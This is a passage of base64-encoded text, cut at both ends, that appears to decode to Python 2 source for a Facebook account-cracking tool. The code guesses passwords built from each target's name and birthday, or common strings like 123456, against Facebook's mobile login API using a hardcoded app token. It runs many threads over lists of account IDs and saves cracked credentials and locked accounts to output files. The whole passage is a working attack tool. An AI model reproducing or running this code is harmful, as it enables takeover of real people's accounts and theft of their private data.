5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejEKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJbWVudV9oYWNrKCkKCQllbHNlOgoJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06CgkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgoJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejEKCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQltZW51X2hhY2soKQoJCQllbHNlOgoJCQkJcHoyID0gYVsnZmlyc3RfbmFtZSddICsgJzEyMzQ1JwoJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisoaWQpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHB6MikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQl5ID0ganNvbi5sb2FkKGRhdGEpCgkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgoJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHoyCgkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQltZW51X2hhY2soKQoJCQkJZWxzZToKCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06CgkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHoyCgkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCW1lbnVfaGFjaygpCgkJCQkJZWxzZToKCQkJCQkJcHozID0gYVsnbGFzdF9uYW1lJ10gKyAnMTIzJwoJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHozKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJeSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgoJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejMKCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQltZW51X2hhY2soKQoJCQkJCQllbHNlOgoJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOgoJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgoJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejMKCQkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQkJCW1lbnVfaGFjaygpCgkJCQkJCQllbHNlOgoJCQkJCQkJCWxhaGlyID0gYVsnYmlydGhkYXknXQoJCQkJCQkJCXB6NCA9IGxhaGlyLnJlcGxhY2UoJy8nLCAnJykKCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHo0KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQl5ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToKCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejQKCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJCQllbHNlOgoJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgoJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejQKCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQltZW51X2hhY2soKQoJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJbGFoaXJzID0gYVsnYmlydGhkYXknXQoJCQkJCQkJCQkJZ2F6ID0gbGFoaXJzLnJlcGxhY2UoJy8nLCAnJykKCQkJCQkJCQkJCXB6NSA9IGFbJ2ZpcnN0X25hbWUnXStnYXoKCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejUpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJCQkJeSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToKCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NQoJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOgoJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCgkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10KCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NQoJCQkJCQkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQkJCQkJCQkJCQltZW51X2hhY2soKQoJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCXB6NiA9ICIxMjM0NTYiCgkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejYpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJCQkJCQl5ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHk6CgkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkCgkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NgoJCQkJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQkJCQkJCW1lbnVfaGFjaygpCgkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCgkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NgoJCQkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkJcHo3ID0gIjA5ODc2NSIKCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHo3KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCQkJCQkJCQl5ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToKCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgoJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddCgkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQKCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejcKCQkJCQkJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQkJCQkJCQkJbWVudV9oYWNrKCkKCQkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiCgkJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZAoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejYKCQkJCQkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCQkJCQkJCQkJCQkJCQltZW51X2hhY2soKQoJCQkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gU29ycnksIGZhaWxlZCB0byBvcGVuIHRoZSB0YXJnZXQgcGFzc3dvcmQgOigiCgkJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVshXSB0cnkgaXQgYW5vdGhlciB3YXkuIgoJCQkJCQkJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJCQkJCQkJCQkJCQkJCW1lbnVfaGFjaygpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gVGVyZ2V0IG5vdCBmb3VuZCIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfaGFjaygpCgkJCQkJCQkJCQkKCQkJCQkJCQkKIyMjIyMgTXVsdGkgQnJ1dGUgRm9yY2UgIyMjIyMKIyMjIyMgQ1JBQ0sgIyMjIwpkZWYgY3JhY2soKToKCWdsb2JhbCBpZGxpc3QscGFzc3csZmlsZQoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglpZGxpc3QgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgSUQgIFwwMzNbMTs5MW06IFwwMzNbMTs5N20nKQoJcGFzc3cgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybVBhc3N3b3JkIFwwMzNbMTs5MW06IFwwMzNbMTs5N20nKQoJdHJ5OgoJCWZpbGUgPSBvcGVuKChpZGxpc3QpLCAiciIpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCgkJZm9yIHggaW4gcmFuZ2UoNDApOgoJCQl6ZWRkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2NyYWssIGFyZ3M9KCkpCgkJCXplZGQuc3RhcnQoKQoJCQl0aHJlYWRzLmFwcGVuZCh6ZWRkKQoJCWZvciB6ZWRkIGluIHRocmVhZHM6CgkJCXplZGQuam9pbigpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCAoIlwwMzNbMTs5MW1bIV0gRmlsZSBub3QgZm91bmQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9oYWNrKCkKCQkKZGVmIHNjcmFrKCk6CglnbG9iYWwgYmVyaGFzaWwsY2VrcG9pbnQsZ2FnYWwsYmFjayx1cAoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCWJ1a2EgPSBvcGVuKGlkbGlzdCwgInIiKQoJCXVwID0gYnVrYS5yZWFkKCkuc3BsaXQoKQoJCXdoaWxlIGZpbGU6CgkJCXVzZXJuYW1lID0gZmlsZS5yZWFkbGluZSgpLnN0cmlwKCkKCQkJdXJsID0gImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VybmFtZSkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzc3cpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiCgkJCWRhdGEgPSB1cmxsaWIudXJsb3Blbih1cmwpCgkJCW1wc2ggPSBqc29uLmxvYWQoZGF0YSkKCQkJaWYgYmFjayA9PSAobGVuKHVwKSk6CgkJCQlicmVhawoJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBtcHNoOgoJCQkJYmlzYSA9IG9wZW4oIm91dC9tYmZfb2sudHh0IiwgInciKQoJCQkJYmlzYS53cml0ZSh1c2VybmFtZSsifCIrcGFzc3crIlxuIikKCQkJCWJpc2EuY2xvc2UoKQoJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VybmFtZSsiP2FjY2Vzc190b2tlbj0iK21wc2hbJ2FjY2Vzc190b2tlbiddKQoJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJYmVyaGFzaWwuYXBwZW5kKCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtT0vinJNcMDMzWzE7OTdtIF0gIit1c2VybmFtZSsifCIgK3Bhc3N3KyIgPT4iK3pbJ25hbWUnXSkKCQkJZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gbXBzaFsiZXJyb3JfbXNnIl06CgkJCQljZWsgPSBvcGVuKCJvdXQvbWJmX2NwLnR4dCIsICJ3IikKCQkJCWNlay53cml0ZSh1c2VybmFtZSsifCIrcGFzc3crIlxuIikKCQkJCWNlay5jbG9zZSgpCgkJCQljZWtwb2ludC5hcHBlbmQoIlwwMzNbMTs5N21bIFwwMzNbMTs5M21DUOKcmlwwMzNbMTs5N20gXSAiK3VzZXJuYW1lKyJ8IiArcGFzc3cpCgkJCWVsc2U6CgkJCQlnYWdhbC5hcHBlbmQodXNlcm5hbWUpCgkJCQliYWNrICs9MQoJCQlzeXMuc3Rkb3V0LndyaXRlKCdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKcuFwwMzNbMTs5MW1dIFwwMzNbMTs5Mm1DcmFjayAgICBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJytzdHIoYmFjaykrJyBcMDMzWzE7OTZtPlwwMzNbMTs5N20gJytzdHIobGVuKHVwKSkrJyA9PlwwMzNbMTs5Mm1MaXZlXDAzM1sxOzkxbTpcMDMzWzE7OTZtJytzdHIobGVuKGJlcmhhc2lsKSkrJyBcMDMzWzE7OTdtPT5cMDMzWzE7OTNtQ2hlY2tcMDMzWzE7OTFtOlwwMzNbMTs5Nm0nK3N0cihsZW4oY2VrcG9pbnQpKSk7c3lzLnN0ZG91dC5mbHVzaCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcblwwMzNbMTs5MW1bIV0gU2xlZXAiCgkJdGltZS5zbGVlcCgxKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgoJCQpkZWYgaGFzaWwoKToKCXByaW50CglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCSMjI0Jlcmhhc2lsCglmb3IgYiBpbiBiZXJoYXNpbDoKCQlwcmludChiKQoJIyMjQ0VLCglmb3IgYyBpbiBjZWtwb2ludDoKCQlwcmludChjKQoJIyMjR2FnYWwKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQgKCJcMDMzWzMxbVt4XSBGYWlsZWQgXDAzM1sxOzk3bS0tPiAiICsgc3RyKGxlbihnYWdhbCkpKQoJa2VsdWFyKCkKCQojIyMjIyMjIyMjIyMjIyMgU1VQRVIgTUJGICMjIyMjIyMjIyMjIyMjIyMKZGVmIHN1cGVyKCk6CglnbG9iYWwgdG9rZXQKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKC